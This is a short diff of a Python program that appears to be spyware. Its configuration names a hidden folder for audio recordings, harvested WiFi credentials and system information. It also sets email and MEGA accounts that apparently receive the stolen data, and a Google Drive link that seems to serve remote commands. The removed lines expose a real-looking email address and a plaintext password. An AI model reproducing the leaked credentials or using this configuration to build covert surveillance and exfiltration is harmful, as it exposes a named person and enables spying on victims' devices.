@@ -41,12 +41,12 @@ AUDIO_RECORD_FILE = os.path.join(HIDDEN_FOLDER, "audio_record.wav")
 WIFI_CREDENTIALS_FILE = os.path.join(HIDDEN_FOLDER, "wifi_credentials.txt")
 SYSTEM_INFO_FILE = os.path.join(HIDDEN_FOLDER, "system_info.txt")
 
-EMAIL_SENDER = "k214790@nu.edu.pk"
+EMAIL_SENDER = "" 
 EMAIL_PASS = ""
-EMAIL_RECEIVER = "k214790@nu.edu.pk"
-MEGA_EMAIL = "k214790@nu.edu.pk"
-MEGA_PASS = "sohaibali123"
-COMMAND_FILE_URL = "https://drive.google.com/file/d/1vsBbsUPbwcHmVA8qGWnM8T3Y2sxH7sRa/view?usp=drive_link"
+EMAIL_RECEIVER = ""
+MEGA_EMAIL = ""
+MEGA_PASS = ""
+COMMAND_FILE_URL = ""  #Google drive text doscument link
 
 SCREEN_SIZE = pyautogui.size()
 FPS = 15
